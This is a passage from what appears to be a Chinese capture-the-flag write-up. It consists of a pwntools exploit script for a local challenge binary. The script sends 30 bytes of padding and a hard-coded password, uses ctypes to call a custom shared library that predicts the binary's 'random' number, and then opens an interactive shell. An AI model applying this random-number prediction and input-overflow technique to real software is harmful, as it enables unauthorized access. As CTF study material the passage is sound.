上面是我们自己写的c代码，gcc成demo.so后，在exp中利用ctypes调用函数计算

```python
from pwn import*
from ctypes import*
context(os='linux', arch='amd64', log_level='debug')
adder = CDLL('./demo.so') 
res_int = adder.suijishu()
sh = process('./random')
payload1 = b'a'*30 
sh.send(payload1)
#pwnlib.gdb.attach(sh)
#pause()
sh.recvuntil('password: ')
sh.send(b"ls_4nyth1n9_7ruIy_R4nd0m?")
#pwnlib.gdb.attach(sh)
#pause()
sh.recvuntil("guess now.")
sh.sendline(str(res_int))
sh.interactive()
```
